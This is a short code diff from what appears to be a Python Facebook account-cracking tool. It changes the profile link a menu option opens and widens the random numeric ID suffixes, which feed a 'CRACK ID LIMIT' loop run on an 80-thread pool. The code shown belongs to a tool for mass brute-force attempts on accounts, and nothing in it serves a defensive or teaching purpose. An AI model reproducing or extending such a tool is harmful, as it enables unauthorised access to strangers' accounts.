@@ -403,7 +403,7 @@ def main():
        os.system(' ')
        sh7()
     if sh =='3':
-       os.system('xdg-open https://www.facebook.com/profile.php?id=100000446995720')
+       os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
        main()  
 
         
@@ -429,7 +429,7 @@ def sh6():
     print(f"")
     limit = int(input(f'%s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(6))
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
     with ThreadPool(max_workers=80) as manshera:    
         clear()
